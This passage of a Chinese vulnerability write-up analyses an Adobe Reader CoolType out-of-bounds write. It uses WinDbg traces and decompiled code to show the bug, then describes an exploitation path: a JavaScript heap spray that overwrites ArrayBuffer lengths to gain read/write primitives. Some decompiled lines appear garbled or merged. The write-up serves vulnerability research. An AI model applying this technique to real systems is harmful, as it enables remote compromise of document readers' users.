继续执行到`sub_800C383`，由于当前MultiByteSize小于WideCharSize *
2，会执行`memset`函数清空MultiByteStr：
    0:008> pc
    eax=0000002e ebx=1306e8a8 ecx=c7dacb9e edx=0b9aea08 esi=00000046 edi=0b9aec3c
    eip=7240410d esp=0b9ae9e0 ebp=0b9aec0c iopl=0         nv up ei ng nz na po cy
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000283
    CoolType!CTGetVersion+0x58add:
    7240410d e87182ecff      call    CoolType!CTInit+0x8d93 (722cc383)
    0:008> dps esp L4
    0b9ae9e0  1306e8a8      //MultiByteStr
    0b9ae9e4  0000002e      //MultiByteSize
    0b9ae9e8  0b9aea08      //WideCharStr
    0b9ae9ec  00000046      //WideCharSize * 2
    0:008> dd 1306e8a8 Lc   //原MultiByte字符串
    1306e8a8  5001d608 51015001 61015101 62016101
    1306e8b8  31016201 7a540f51 01521d18 20736e18
    1306e8c8  74736574 74747474 74747474 00007474
    0:008> p
    eax=00000022 ebx=1306e8a8 ecx=7df11661 edx=00000000 esi=00000046 edi=0b9aec3c
    eip=72404112 esp=0b9ae9e0 ebp=0b9aec0c iopl=0         nv up ei pl nz ac po nc
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000212
    CoolType!CTGetVersion+0x58ae2:
    72404112 83c410          add     esp,10h
    0:008> dd 1306e8a8 Lc   //执行函数后被清空
    1306e8a8  00000000 00000000 00000000 00000000
    1306e8b8  00000000 00000000 00000000 00000000
    1306e8c8  00000000 00000000 00000000 00000000
随后遍历被清空的MultByteStr，遍历的次数为转换后的WideChar的大小。当前MultByte的大小为0x2e，WideChar的大小为0x46。因此遍历到超过MultByte的大小时就造成了越界访问。
    LABEL_83:
        if ( (_WORD)MultSize )
        {
          v44 = (_BYTE *)(EmptyMultByteStr + 1);
          v45 = ~EmptyMultByteStr;
          v51 = ~EmptyMultByteStr;
          do
          {
            if ( *(v44 - 1) || *v44 )       //POC崩溃处
            {
              if ( &v44[v45] != (_BYTE *)offset )
              {
                *(_BYTE *)(EmptyMultByteStr + offset) = *(v44 - 1);
                *(_BYTE *)(offset + EmptyMultByteStr + 1) = *v44;
              }
              offset += 2;
            }
            MultSize = *(unsigned __int16 *)a3;
            v44 += 2;
            v46 = (int)&v44[v45] = *(_WORD *)(this + 0x14) )
          return 0;
      }
      *a6 = MultiByteLength;
      MultiByteStr = *(_DWORD *)(this + 4) + *(unsigned __int16 *)(this + 0x16) + (v17 | (v18  0xA )
          goto LABEL_22;
      }
      v14 = (void *)alloc(LOWORD(MultiByte[0]) + 1);// 调用malloc申请大小为MultiByteStr长度加1的内存空间
      memcpy(v14, oldMultStr, LOWORD(MultiByte[0]));// 拷贝MultiByteStr到新申请的内存中
修改POC使得MultiByteStr的长度为0x10f，通过JS代码堆喷射大小为0x100的ArrayBuffer对象同时制造内存空洞，使得MultiByteStr位于两个ArrayBuffer对象之中，修改后的内存布局如下：
    0:009> g
    Breakpoint 0 hit
    eax=0000010f ebx=0b5aea10 ecx=0b5aec3c edx=0000010f esi=1db0a4a0 edi=00000001
    eip=709bfcb0 esp=0b5ae838 ebp=0b5ae9d4 iopl=0         nv up ei ng nz ac pe cy
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000297
    CoolType!CTInit+0x1c6c0:
    709bfcb0 55              push    ebp
    0:009> dps esp+4 L7
    0b5ae83c  1db0a4a0
    0b5ae840  0000010f
    0b5ae844  0b5ae8f0
    0b5ae848  00000001
    0b5ae84c  00000000
    0b5ae850  00000001
    0b5ae854  00000000
    0:009> dd 1db0a4a0 L(110*2+8)/4
    //----------------MultiByteStr---------------    1db0a4a0  41004100 41004100 41004100 41004100
    1db0a4b0  41004100 41004100 41004100 41004100
    1db0a4c0  41004100 41004100 41004100 41004100
    1db0a4d0  41004100 41004100 41004100 41004100
    1db0a4e0  41004100 41004100 41004100 41004100
    1db0a4f0  41004100 41004100 41004100 41004100
    1db0a500  41004100 41004100 41004100 41004100
    1db0a510  41004100 41004100 41004100 41004100
    1db0a520  41004100 41004100 41004100 41004100
    1db0a530  41004100 41004100 41004100 41004100
    1db0a540  41004100 41004100 41004100 41004100
    1db0a550  41004100 41004100 41004100 41004100
    1db0a560  41004100 41004100 41004100 41004100
    1db0a570  41004100 41004100 41004100 41004100
    1db0a580  41004100 41004100 41004100 41004100
    1db0a590  41004100 41004100 41004100 41414100
    1db0a5a0  41414141 41414141 41414141 00414141
    //-------------------------------------------    1db0a5b0  399fd8af 88009700 00000000 00000100   //Arraybuffer.ByteLength = 0x100
    1db0a5c0  00000000 00000000 ffffffff ffffffff
    1db0a5d0  ffffffff ffffffff ffffffff ffffffff
    1db0a5e0  ffffffff ffffffff ffffffff ffffffff
    1db0a5f0  ffffffff ffffffff ffffffff ffffffff
    1db0a600  ffffffff ffffffff ffffffff ffffffff
    1db0a610  ffffffff ffffffff ffffffff ffffffff
    1db0a620  ffffffff ffffffff ffffffff ffffffff
    1db0a630  ffffffff ffffffff ffffffff ffffffff
    1db0a640  ffffffff ffffffff ffffffff ffffffff
    1db0a650  ffffffff ffffffff ffffffff ffffffff
    1db0a660  ffffffff ffffffff ffffffff ffffffff
    1db0a670  ffffffff ffffffff ffffffff ffffffff
    1db0a680  ffffffff ffffffff ffffffff ffffffff
    1db0a690  ffffffff ffffffff ffffffff ffffffff
    1db0a6a0  ffffffff ffffffff ffffffff ffffffff
    1db0a6b0  ffffffff ffffffff ffffffff ffffffff
    1db0a6c0  ffffffff ffffffff
执行完毕`MultiToWide`函数后，临近Arraybuffer对象的长度被覆盖为0x410041：
    0:009> dd 1db0a4a0 L(110*2+8)/4
    //----------------MultiByteStr---------------    1db0a4a0  00410041 00410041 00410041 00410041
    1db0a4b0  00410041 00410041 00410041 00410041
    1db0a4c0  00410041 00410041 00410041 00410041
    1db0a4d0  00410041 00410041 00410041 00410041
    1db0a4e0  00410041 00410041 00410041 00410041
    1db0a4f0  00410041 00410041 00410041 00410041
    1db0a500  00410041 00410041 00410041 00410041
    1db0a510  00410041 00410041 00410041 00410041
    1db0a520  00410041 00410041 00410041 00410041
    1db0a530  00410041 00410041 00410041 00410041
    1db0a540  00410041 00410041 00410041 00410041
    1db0a550  00410041 00410041 00410041 00410041
    1db0a560  00410041 00410041 00410041 00410041
    1db0a570  00410041 00410041 00410041 00410041
    1db0a580  00410041 00410041 00410041 00410041
    1db0a590  00410041 00410041 00410041 00410041
    1db0a5a0  00410041 00410041 00410041 00410041
    //-------------------------------------------    1db0a5b0  00410041 00410041 00410041 00410041   //Arraybuffer.ByteLength = 0x410041
    1db0a5c0  00000000 00000000 ffffffff ffffffff
    1db0a5d0  ffffffff ffffffff ffffffff ffffffff
    1db0a5e0  ffffffff ffffffff ffffffff ffffffff
    1db0a5f0  ffffffff ffffffff ffffffff ffffffff
    1db0a600  ffffffff ffffffff ffffffff ffffffff
    1db0a610  ffffffff ffffffff ffffffff ffffffff
    1db0a620  ffffffff ffffffff ffffffff ffffffff
    1db0a630  ffffffff ffffffff ffffffff ffffffff
    1db0a640  ffffffff ffffffff ffffffff ffffffff
    1db0a650  ffffffff ffffffff ffffffff ffffffff
    1db0a660  ffffffff ffffffff ffffffff ffffffff
    1db0a670  ffffffff ffffffff ffffffff ffffffff
    1db0a680  ffffffff ffffffff ffffffff ffffffff
    1db0a690  ffffffff ffffffff ffffffff ffffffff
    1db0a6a0  ffffffff ffffffff ffffffff ffffffff
    1db0a6b0  ffffffff ffffffff ffffffff ffffffff
    1db0a6c0  ffffffff ffffffff
此时已经具有了越界写的能力，再次修改下一个临近Arraybuffer的对象的长度为0xFFFFFFFF即可完成读写原语的构造，剩下的利用过程大同小异就不再赘述了。
最终在Windows 10上完成了整个利用：
## 总结
该漏洞为Adobe Reader越界写漏洞，由于解析字体将字符串转化为宽字节字符串时没有进行完整的校验导致越界拷贝，利用的难度不大且触发稳定。
* * *